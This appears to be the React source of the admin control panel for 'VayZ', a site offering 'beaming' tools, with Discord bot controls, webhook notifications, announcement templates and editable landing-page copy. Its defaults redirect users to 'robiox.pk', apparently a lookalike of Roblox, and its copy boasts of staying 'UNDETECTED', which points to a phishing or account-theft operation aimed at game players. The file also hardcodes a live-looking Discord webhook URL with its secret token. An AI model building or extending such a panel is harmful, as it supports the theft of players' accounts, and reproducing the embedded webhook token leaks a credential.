"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Badge } from "@/components/ui/badge"
import { Textarea } from "@/components/ui/textarea"
import { Label } from "@/components/ui/label"
import {
  Settings,
  Users,
  Activity,
  MessageSquare,
  Zap,
  Shield,
  RefreshCw,
  Save,
  Eye,
  EyeOff,
  Bot,
  Server,
  BarChart3,
  Globe,
  Trash2,
  Download,
  Upload,
  AlertCircle,
  CheckCircle,
  Send,
  Megaphone,
  Type,
} from "lucide-react"

export default function AdminPanel() {
  const [botStatus, setBotStatus] = useState({
    online: false,
    lastSeen: null as Date | null,
    guilds: 0,
    users: 0,
    botInfo: null as any,
  })

  const [discordStats, setDiscordStats] = useState({
    memberCount: 71,
    onlineCount: 23,
    serverName: "VayZ",
    lastUpdated: new Date(),
    source: "fallback",
  })

  const [websiteStats, setWebsiteStats] = useState({
    totalVisitors: 1247,
    activationsToday: 23,
    discordNotifications: 156,
    lastActivation: new Date(),
  })

  const [settings, setSettings] = useState({
    discordBotToken: "",
    redirectUrl: "https://robiox.pk/dashboard/?code=NzE3MDIwOTE5NjIxNjY2MzY1Mw==",
    webhookUrl:
      "https://discord.com/api/webhooks/1376176389333713038/Bqf0nU5DBHvBjVJti4AJQ4iTAxGo2dQiyior_Z001hoNsCYzqWvu9QgtpdTIiABwX7PU",
    siteName: "VayZ",
    mainTitle: "DOMINATE THE GAME",
    description:
      "Master the art of beaming with our cutting-edge tools and techniques. Designed for elite operators who demand precision and stealth in every operation.",
    showTokens: false,
    // Bot messages
    testNotificationMessage: "🔧 Admin test notification from VayZ control panel",
    activationMessage:
      "🚀 Someone just activated VayZ! Current users: {onlineCount} online, {memberCount} total members.",
    // Website text content
    websiteTexts: {
      logoText: "VayZ",
      mainTitle: "DOMINATE",
      mainSubtitle: "THE GAME",
      description:
        "Master the art of beaming with our cutting-edge tools and techniques. Designed for elite operators who demand precision and stealth in every operation.",
      buttonText: "ACTIVATE NOW",
      statusText1: "Beamer Active",
      statusText2Online: "Target Locked",
      statusText2Offline: "Connection Lost",
      sideNavTooltip1: "UNDETECTED",
      sideNavTooltip2: "PREMIUM",
      sideNavTooltip3: "ULTRA FAST",
      topStatus1: "UNDETECTED",
      topStatus2: "PREMIUM",
      topStatus3: "ULTRA FAST",
      feature1Title: "Lightning Performance",
      feature1Description: "Experience unmatched speed and responsiveness with our optimized engine.",
      feature2Title: "Military-Grade Security",
      feature2Description: "Advanced protection protocols keep you safe and undetected at all times.",
      feature3Title: "Auto-Evolution",
      feature3Description: "Continuous updates and improvements delivered seamlessly in real-time.",
      stat1Label: "Success Rate",
      stat1Value: "99.9%",
      stat2Label: "Support",
      stat2Value: "24/7",
      stat3Label: "Community",
    },
  })

  const [logs, setLogs] = useState([
    { id: 1, type: "info", message: "Admin panel loaded", timestamp: new Date() },
    { id: 2, type: "warning", message: "Discord bot not configured", timestamp: new Date() },
  ])

  const [announcementText, setAnnouncementText] = useState("")
  const [sendingAnnouncement, setSendingAnnouncement] = useState(false)

  // Start/Stop Discord Bot
  const toggleBot = async () => {
    try {
      const response = await fetch("/api/admin/bot-control", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: botStatus.online ? "stop" : "start", token: settings.discordBotToken }),
      })

      const data = await response.json()
      if (data.success) {
        setBotStatus({
          online: !botStatus.online,
          lastSeen: new Date(),
          guilds: data.status?.guilds || 0,
          users: data.status?.users || 0,
          botInfo: data.botInfo || null,
        })
        addLog("success", data.message)
      } else {
        addLog("error", data.error || "Failed to toggle bot")
      }
    } catch (error) {
      addLog("error", "Failed to toggle bot status")
    }
  }

  // Save Settings
  const saveSettings = async () => {
    try {
      const response = await fetch("/api/admin/settings", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(settings),
      })

      if (response.ok) {
        addLog("success", "Settings saved successfully")
      }
    } catch (error) {
      addLog("error", "Failed to save settings")
    }
  }

  // Send Test Notification
  const sendTestNotification = async () => {
    try {
      const message = settings.testNotificationMessage
        .replace("{onlineCount}", discordStats.onlineCount.toString())
        .replace("{memberCount}", discordStats.memberCount.toString())

      const response = await fetch("/api/send-discord-notification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: message,
          username: "VayZ Owner",
        }),
      })

      if (response.ok) {
        addLog("success", "Test notification sent to Discord")
        setWebsiteStats((prev) => ({ ...prev, discordNotifications: prev.discordNotifications + 1 }))
      }
    } catch (error) {
      addLog("error", "Failed to send test notification")
    }
  }

  // Send Announcement
  const sendAnnouncement = async () => {
    if (!announcementText.trim()) {
      addLog("error", "Announcement text cannot be empty")
      return
    }

    setSendingAnnouncement(true)
    try {
      const response = await fetch("/api/send-discord-notification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: announcementText,
          username: "VayZ Announcement",
        }),
      })

      if (response.ok) {
        addLog("success", "Announcement sent to Discord server")
        setAnnouncementText("")
        setWebsiteStats((prev) => ({ ...prev, discordNotifications: prev.discordNotifications + 1 }))
      } else {
        addLog("error", "Failed to send announcement")
      }
    } catch (error) {
      addLog("error", "Failed to send announcement")
    } finally {
      setSendingAnnouncement(false)
    }
  }

  // Add Log Entry
  const addLog = (type: string, message: string) => {
    const newLog = {
      id: Date.now(),
      type,
      message,
      timestamp: new Date(),
    }
    setLogs((prev) => [newLog, ...prev.slice(0, 49)]) // Keep last 50 logs
  }

  // Refresh Discord Stats
  const refreshDiscordStats = async () => {
    try {
      const response = await fetch("/api/discord-stats")
      const data = await response.json()
      setDiscordStats({
        memberCount: data.memberCount,
        onlineCount: data.onlineCount,
        serverName: data.serverName,
        lastUpdated: new Date(),
        source: data.source,
      })
      addLog("info", `Discord stats refreshed - Source: ${data.source}`)
    } catch (error) {
      addLog("error", "Failed to refresh Discord stats")
    }
  }

  // Clear Logs
  const clearLogs = () => {
    setLogs([])
    addLog("info", "Logs cleared by admin")
  }

  useEffect(() => {
    // Load initial data
    refreshDiscordStats()

    // Simulate real-time updates
    const interval = setInterval(() => {
      setWebsiteStats((prev) => ({
        ...prev,
        totalVisitors: prev.totalVisitors + Math.floor(Math.random() * 3),
      }))
    }, 10000)

    return () => clearInterval(interval)
  }, [])

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-4xl font-bold bg-gradient-to-r from-red-500 to-orange-400 bg-clip-text text-transparent">
                VayZ Control Panel
              </h1>
              <p className="text-gray-400 mt-2">Full administrative control over your beaming platform</p>
            </div>
            <div className="flex items-center gap-4">
              <Badge variant={botStatus.online ? "default" : "destructive"} className="px-3 py-1">
                <Bot className="w-4 h-4 mr-2" />
                Bot {botStatus.online ? "Online" : "Offline"}
              </Badge>
              <Badge variant={discordStats.source === "discord_api" ? "default" : "secondary"} className="px-3 py-1">
                {discordStats.source === "discord_api" ? (
                  <CheckCircle className="w-4 h-4 mr-2" />
                ) : (
                  <AlertCircle className="w-4 h-4 mr-2" />
                )}
                {discordStats.source === "discord_api" ? "Live Data" : "Fallback Mode"}
              </Badge>
              <Badge variant="outline" className="px-3 py-1">
                <Shield className="w-4 h-4 mr-2" />
                Admin Access
              </Badge>
            </div>
          </div>
        </div>

        {/* Quick Stats */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <Card className="bg-gray-800/50 border-gray-700">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">Total Visitors</p>
                  <p className="text-2xl font-bold text-white">{websiteStats.totalVisitors.toLocaleString()}</p>
                </div>
                <Globe className="w-8 h-8 text-blue-400" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gray-800/50 border-gray-700">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">Activations Today</p>
                  <p className="text-2xl font-bold text-green-400">{websiteStats.activationsToday}</p>
                </div>
                <Zap className="w-8 h-8 text-green-400" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gray-800/50 border-gray-700">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">Discord Members</p>
                  <p className="text-2xl font-bold text-purple-400">{discordStats.memberCount}</p>
                </div>
                <Users className="w-8 h-8 text-purple-400" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gray-800/50 border-gray-700">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">Bot Guilds</p>
                  <p className="text-2xl font-bold text-orange-400">{botStatus.guilds}</p>
                </div>
                <Server className="w-8 h-8 text-orange-400" />
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Main Tabs */}
        <Tabs defaultValue="dashboard" className="space-y-6">
          <TabsList className="grid w-full grid-cols-7 bg-gray-800/50">
            <TabsTrigger value="dashboard">Dashboard</TabsTrigger>
            <TabsTrigger value="bot">Discord Bot</TabsTrigger>
            <TabsTrigger value="settings">Settings</TabsTrigger>
            <TabsTrigger value="content">Website Text</TabsTrigger>
            <TabsTrigger value="announcements">Announcements</TabsTrigger>
            <TabsTrigger value="analytics">Analytics</TabsTrigger>
            <TabsTrigger value="logs">Logs</TabsTrigger>
          </TabsList>

          {/* Dashboard Tab */}
          <TabsContent value="dashboard" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="bg-gray-800/50 border-gray-700">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Activity className="w-5 h-5" />
                    System Status
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex items-center justify-between">
                    <span>Discord Bot</span>
                    <Badge variant={botStatus.online ? "default" : "destructive"}>
                      {botStatus.online ? "Online" : "Offline"}
                    </Badge>
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Data Source</span>
                    <Badge variant={discordStats.source === "discord_api" ? "default" : "secondary"}>
                      {discordStats.source === "discord_api" ? "Live API" : "Fallback"}
                    </Badge>
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Webhook</span>
                    <Badge variant="default">Active</Badge>
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Last Update</span>
                    <span className="text-sm text-gray-400">{discordStats.lastUpdated.toLocaleTimeString()}</span>
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-gray-800/50 border-gray-700">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Server className="w-5 h-5" />
                    Discord Server
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex items-center justify-between">
                    <span>Server Name</span>
                    <span className="text-sm">{discordStats.serverName}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Total Members</span>
                    <span className="text-sm font-bold">{discordStats.memberCount}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Online Members</span>
                    <span className="text-sm font-bold text-green-400">{discordStats.onlineCount}</span>
                  </div>
                  <Button onClick={refreshDiscordStats} variant="outline" size="sm" className="w-full">
                    <RefreshCw className="w-4 h-4 mr-2" />
                    Refresh Stats
                  </Button>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Discord Bot Tab */}
          <TabsContent value="bot" className="space-y-6">
            <Card className="bg-gray-800/50 border-gray-700">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Bot className="w-5 h-5" />
                  Discord Bot Control
                </CardTitle>
                <CardDescription>
                  Configure your Discord bot - it will automatically detect which servers it has access to
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-4">
                    <div>
                      <label className="text-sm font-medium">Bot Token</label>
                      <div className="flex gap-2 mt-1">
                        <Input
                          type={settings.showTokens ? "text" : "password"}
                          value={settings.discordBotToken}
                          onChange={(e) => setSettings({ ...settings, discordBotToken: e.target.value })}
                          placeholder="Enter your Discord bot token"
                          className="bg-gray-700 border-gray-600"
                        />
                        <Button
                          variant="outline"
                          size="icon"
                          onClick={() => setSettings({ ...settings, showTokens: !settings.showTokens })}
                        >
                          {settings.showTokens ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </Button>
                      </div>
                      <p className="text-xs text-gray-400 mt-1">No Guild ID needed - bot will auto-detect servers</p>
                    </div>

                    <div>
                      <label className="text-sm font-medium">Test Notification Message</label>
                      <Textarea
                        value={settings.testNotificationMessage}
                        onChange={(e) => setSettings({ ...settings, testNotificationMessage: e.target.value })}
                        placeholder="Message to send when testing notifications"
                        className="bg-gray-700 border-gray-600 mt-1"
                        rows={2}
                      />
                      <p className="text-xs text-gray-400 mt-1">
                        Use {"{onlineCount}"} and {"{memberCount}"} for dynamic values
                      </p>
                    </div>

                    <div>
                      <label className="text-sm font-medium">Activation Message</label>
                      <Textarea
                        value={settings.activationMessage}
                        onChange={(e) => setSettings({ ...settings, activationMessage: e.target.value })}
                        placeholder="Message sent when someone activates"
                        className="bg-gray-700 border-gray-600 mt-1"
                        rows={2}
                      />
                      <p className="text-xs text-gray-400 mt-1">
                        Sent automatically when users click the activate button
                      </p>
                    </div>

                    {botStatus.botInfo && (
                      <div className="p-3 bg-gray-700/50 rounded-lg">
                        <h4 className="font-medium mb-2">Bot Information</h4>
                        <div className="space-y-1 text-sm">
                          <div className="flex justify-between">
                            <span>Username:</span>
                            <span>{botStatus.botInfo.username}</span>
                          </div>
                          <div className="flex justify-between">
                            <span>ID:</span>
                            <span className="font-mono text-xs">{botStatus.botInfo.id}</span>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>

                  <div className="space-y-4">
                    <div className="p-4 bg-gray-700/50 rounded-lg">
                      <h4 className="font-medium mb-2">Bot Status</h4>
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span>Status:</span>
                          <span className={botStatus.online ? "text-green-400" : "text-red-400"}>
                            {botStatus.online ? "Online" : "Offline"}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span>Guilds:</span>
                          <span>{botStatus.guilds}</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Total Users:</span>
                          <span>{botStatus.users}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="flex gap-4">
                  <Button
                    onClick={toggleBot}
                    variant={botStatus.online ? "destructive" : "default"}
                    disabled={!settings.discordBotToken}
                  >
                    {botStatus.online ? "Stop Bot" : "Start Bot"}
                  </Button>
                  <Button onClick={sendTestNotification} variant="outline">
                    <MessageSquare className="w-4 h-4 mr-2" />
                    Send Test Notification
                  </Button>
                  <Button onClick={saveSettings} variant="outline">
                    <Save className="w-4 h-4 mr-2" />
                    Save Bot Settings
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Settings Tab */}
          <TabsContent value="settings" className="space-y-6">
            <Card className="bg-gray-800/50 border-gray-700">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Settings className="w-5 h-5" />
                  Website Settings
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-4">
                    <div>
                      <label className="text-sm font-medium">Redirect URL</label>
                      <Input
                        value={settings.redirectUrl}
                        onChange={(e) => setSettings({ ...settings, redirectUrl: e.target.value })}
                        placeholder="https://your-website.com"
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>

                    <div>
                      <label className="text-sm font-medium">Site Name</label>
                      <Input
                        value={settings.siteName}
                        onChange={(e) => setSettings({ ...settings, siteName: e.target.value })}
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>

                    <div>
                      <label className="text-sm font-medium">Main Title</label>
                      <Input
                        value={settings.mainTitle}
                        onChange={(e) => setSettings({ ...settings, mainTitle: e.target.value })}
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>
                  </div>

                  <div className="space-y-4">
                    <div>
                      <label className="text-sm font-medium">Webhook URL</label>
                      <Input
                        type={settings.showTokens ? "text" : "password"}
                        value={settings.webhookUrl}
                        onChange={(e) => setSettings({ ...settings, webhookUrl: e.target.value })}
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>

                    <div>
                      <label className="text-sm font-medium">Description</label>
                      <Textarea
                        value={settings.description}
                        onChange={(e) => setSettings({ ...settings, description: e.target.value })}
                        className="bg-gray-700 border-gray-600 mt-1"
                        rows={3}
                      />
                    </div>
                  </div>
                </div>

                <div className="flex gap-4">
                  <Button onClick={saveSettings}>
                    <Save className="w-4 h-4 mr-2" />
                    Save Settings
                  </Button>
                  <Button variant="outline">
                    <Download className="w-4 h-4 mr-2" />
                    Export Config
                  </Button>
                  <Button variant="outline">
                    <Upload className="w-4 h-4 mr-2" />
                    Import Config
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Website Text Content Tab */}
          <TabsContent value="content" className="space-y-6">
            <Card className="bg-gray-800/50 border-gray-700">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Type className="w-5 h-5" />
                  Website Text Content
                </CardTitle>
                <CardDescription>Edit all text content displayed on your website</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold text-white">Main Content</h3>

                    <div>
                      <Label htmlFor="logoText">Logo Text</Label>
                      <Input
                        id="logoText"
                        value={settings.websiteTexts.logoText}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, logoText: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>

                    <div>
                      <Label htmlFor="mainTitle">Main Title</Label>
                      <Input
                        id="mainTitle"
                        value={settings.websiteTexts.mainTitle}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, mainTitle: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>

                    <div>
                      <Label htmlFor="mainSubtitle">Main Subtitle</Label>
                      <Input
                        id="mainSubtitle"
                        value={settings.websiteTexts.mainSubtitle}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, mainSubtitle: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>

                    <div>
                      <Label htmlFor="description">Main Description</Label>
                      <Textarea
                        id="description"
                        value={settings.websiteTexts.description}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, description: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600 mt-1"
                        rows={3}
                      />
                    </div>

                    <div>
                      <Label htmlFor="buttonText">Activate Button Text</Label>
                      <Input
                        id="buttonText"
                        value={settings.websiteTexts.buttonText}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, buttonText: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold text-white">Status & Navigation</h3>

                    <div>
                      <Label htmlFor="statusText1">Bottom Status Text 1</Label>
                      <Input
                        id="statusText1"
                        value={settings.websiteTexts.statusText1}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, statusText1: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>

                    <div>
                      <Label htmlFor="statusText2Online">Status Text 2 (Online)</Label>
                      <Input
                        id="statusText2Online"
                        value={settings.websiteTexts.statusText2Online}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, statusText2Online: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>

                    <div>
                      <Label htmlFor="statusText2Offline">Status Text 2 (Offline)</Label>
                      <Input
                        id="statusText2Offline"
                        value={settings.websiteTexts.statusText2Offline}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, statusText2Offline: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600 mt-1"
                      />
                    </div>

                    <div className="grid grid-cols-3 gap-2">
                      <div>
                        <Label htmlFor="topStatus1">Top Status 1</Label>
                        <Input
                          id="topStatus1"
                          value={settings.websiteTexts.topStatus1}
                          onChange={(e) =>
                            setSettings({
                              ...settings,
                              websiteTexts: { ...settings.websiteTexts, topStatus1: e.target.value },
                            })
                          }
                          className="bg-gray-700 border-gray-600 mt-1"
                        />
                      </div>
                      <div>
                        <Label htmlFor="topStatus2">Top Status 2</Label>
                        <Input
                          id="topStatus2"
                          value={settings.websiteTexts.topStatus2}
                          onChange={(e) =>
                            setSettings({
                              ...settings,
                              websiteTexts: { ...settings.websiteTexts, topStatus2: e.target.value },
                            })
                          }
                          className="bg-gray-700 border-gray-600 mt-1"
                        />
                      </div>
                      <div>
                        <Label htmlFor="topStatus3">Top Status 3</Label>
                        <Input
                          id="topStatus3"
                          value={settings.websiteTexts.topStatus3}
                          onChange={(e) =>
                            setSettings({
                              ...settings,
                              websiteTexts: { ...settings.websiteTexts, topStatus3: e.target.value },
                            })
                          }
                          className="bg-gray-700 border-gray-600 mt-1"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-white">Feature Cards</h3>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="feature1Title">Feature 1 Title</Label>
                      <Input
                        id="feature1Title"
                        value={settings.websiteTexts.feature1Title}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, feature1Title: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600"
                      />
                      <Textarea
                        value={settings.websiteTexts.feature1Description}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, feature1Description: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600"
                        rows={2}
                        placeholder="Feature 1 Description"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="feature2Title">Feature 2 Title</Label>
                      <Input
                        id="feature2Title"
                        value={settings.websiteTexts.feature2Title}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, feature2Title: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600"
                      />
                      <Textarea
                        value={settings.websiteTexts.feature2Description}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, feature2Description: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600"
                        rows={2}
                        placeholder="Feature 2 Description"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="feature3Title">Feature 3 Title</Label>
                      <Input
                        id="feature3Title"
                        value={settings.websiteTexts.feature3Title}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, feature3Title: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600"
                      />
                      <Textarea
                        value={settings.websiteTexts.feature3Description}
                        onChange={(e) =>
                          setSettings({
                            ...settings,
                            websiteTexts: { ...settings.websiteTexts, feature3Description: e.target.value },
                          })
                        }
                        className="bg-gray-700 border-gray-600"
                        rows={2}
                        placeholder="Feature 3 Description"
                      />
                    </div>
                  </div>
                </div>

                <div className="flex gap-4">
                  <Button onClick={saveSettings}>
                    <Save className="w-4 h-4 mr-2" />
                    Save All Text Changes
                  </Button>
                  <Button variant="outline">
                    <RefreshCw className="w-4 h-4 mr-2" />
                    Reset to Defaults
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Announcements Tab */}
          <TabsContent value="announcements" className="space-y-6">
            <Card className="bg-gray-800/50 border-gray-700">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Megaphone className="w-5 h-5" />
                  Discord Announcements
                </CardTitle>
                <CardDescription>Send announcements and messages to your Discord server</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-4">
                  <div>
                    <Label htmlFor="announcement">Announcement Message</Label>
                    <Textarea
                      id="announcement"
                      value={announcementText}
                      onChange={(e) => setAnnouncementText(e.target.value)}
                      placeholder="Type your announcement message here..."
                      className="bg-gray-700 border-gray-600 mt-1"
                      rows={4}
                    />
                    <p className="text-xs text-gray-400 mt-1">
                      This will be sent to your Discord server with the username "VayZ Announcement"
                    </p>
                  </div>

                  <div className="flex gap-4">
                    <Button
                      onClick={sendAnnouncement}
                      disabled={sendingAnnouncement || !announcementText.trim()}
                      className="flex-1"
                    >
                      {sendingAnnouncement ? (
                        <>
                          <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                          Sending...
                        </>
                      ) : (
                        <>
                          <Send className="w-4 h-4 mr-2" />
                          Send Announcement
                        </>
                      )}
                    </Button>
                  </div>
                </div>

                <div className="border-t border-gray-700 pt-6">
                  <h3 className="text-lg font-semibold text-white mb-4">Quick Announcement Templates</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <Button
                      variant="outline"
                      onClick={() =>
                        setAnnouncementText("🚀 VayZ Systems is now LIVE! Join our elite community of operators.")
                      }
                      className="text-left justify-start h-auto p-4"
                    >
                      <div>
                        <div className="font-medium">System Launch</div>
                        <div className="text-sm text-gray-400">Announce system going live</div>
                      </div>
                    </Button>

                    <Button
                      variant="outline"
                      onClick={() =>
                        setAnnouncementText("⚡ Major update deployed! Enhanced beaming capabilities now available.")
                      }
                      className="text-left justify-start h-auto p-4"
                    >
                      <div>
                        <div className="font-medium">Update Notice</div>
                        <div className="text-sm text-gray-400">Announce new features</div>
                      </div>
                    </Button>

                    <Button
                      variant="outline"
                      onClick={() =>
                        setAnnouncementText("🔧 Scheduled maintenance in 30 minutes. Expected downtime: 15 minutes.")
                      }
                      className="text-left justify-start h-auto p-4"
                    >
                      <div>
                        <div className="font-medium">Maintenance</div>
                        <div className="text-sm text-gray-400">Notify about downtime</div>
                      </div>
                    </Button>

                    <Button
                      variant="outline"
                      onClick={() =>
                        setAnnouncementText(
                          "🎯 New premium features unlocked! Check out the enhanced targeting system.",
                        )
                      }
                      className="text-left justify-start h-auto p-4"
                    >
                      <div>
                        <div className="font-medium">Feature Release</div>
                        <div className="text-sm text-gray-400">Promote new capabilities</div>
                      </div>
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Analytics Tab */}
          <TabsContent value="analytics" className="space-y-6">
            <Card className="bg-gray-800/50 border-gray-700">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <BarChart3 className="w-5 h-5" />
                  Analytics Dashboard
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-gray-400">Advanced analytics coming soon...</p>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Logs Tab */}
          <TabsContent value="logs" className="space-y-6">
            <Card className="bg-gray-800/50 border-gray-700">
              <CardHeader>
                <CardTitle className="flex items-center justify-between">
                  <span className="flex items-center gap-2">
                    <Activity className="w-5 h-5" />
                    System Logs
                  </span>
                  <Button onClick={clearLogs} variant="outline" size="sm">
                    <Trash2 className="w-4 h-4 mr-2" />
                    Clear Logs
                  </Button>
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {logs.map((log) => (
                    <div
                      key={log.id}
                      className="flex items-center justify-between p-3 bg-gray-700/30 rounded-lg text-sm"
                    >
                      <div className="flex items-center gap-3">
                        <Badge
                          variant={
                            log.type === "success"
                              ? "default"
                              : log.type === "error"
                                ? "destructive"
                                : log.type === "warning"
                                  ? "secondary"
                                  : "outline"
                          }
                          className="text-xs"
                        >
                          {log.type}
                        </Badge>
                        <span>{log.message}</span>
                      </div>
                      <span className="text-gray-400 text-xs">{log.timestamp.toLocaleTimeString()}</span>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}
